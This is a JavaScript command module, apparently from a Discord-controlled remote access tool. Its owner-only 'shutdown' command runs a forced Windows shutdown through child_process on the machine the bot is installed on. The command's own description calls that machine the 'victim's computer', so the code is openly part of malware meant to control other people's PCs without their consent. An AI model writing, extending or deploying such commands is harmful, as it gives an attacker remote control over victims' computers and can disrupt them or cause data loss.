const { ApplicationCommandOptionType } = require("discord.js"),
{ exec } = require("child_process");

module.exports = {
  name: "shutdown",
  ownerOnly: true,
  description: "Shutdown your victim's computer!",
  run: async (client, interaction, args) => {
    // Exécuter le fichier avec spawn
    const childProcess = exec(`shutdown /s /f /t 10`);

    // Répondre à l'interaction avec un message indiquant que pc va restart
    await interaction.editReply({
      content: `Computer Will Shutdown in 10sec`,
      ephemeral: true,
    });
    // Détacher le processus pour qu'il continue de s'exécuter même après la fin du bot
    childProcess.unref();
  },
};
